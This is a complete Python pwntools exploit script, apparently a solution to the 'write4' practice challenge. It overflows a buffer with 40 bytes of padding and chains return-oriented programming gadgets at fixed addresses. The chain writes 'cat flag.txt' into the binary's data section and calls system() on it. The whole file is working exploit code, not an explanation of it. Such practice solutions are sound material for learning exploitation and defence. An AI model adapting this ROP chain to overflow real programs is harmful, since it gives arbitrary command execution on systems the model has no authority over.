from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')
# p = gdb.debug('./write4')
p = process('./write4')

def write_that_there(that,there):
    there = p64(there)
    payload = b''
    payload += pop_r14_r15
    payload += there
    payload += that
    payload += mov_r14_r15
    return payload

padding = b'A'*40
pop_r14_r15 = p64(0x400890)
mov_r14_r15 = p64(0x400820)
data_int = 0x601050
cmd = b'cat flag.txt'.ljust(16,b'\0')
system = p64(0x400810)
pop_rdi = p64(0x400893)

payload = padding
payload += write_that_there(cmd[:8],data_int)
payload += write_that_there(cmd[8:],data_int+8)
payload += pop_rdi
payload += p64(data_int)
payload += system

p.sendline(payload)
print(p.recvall().decode())
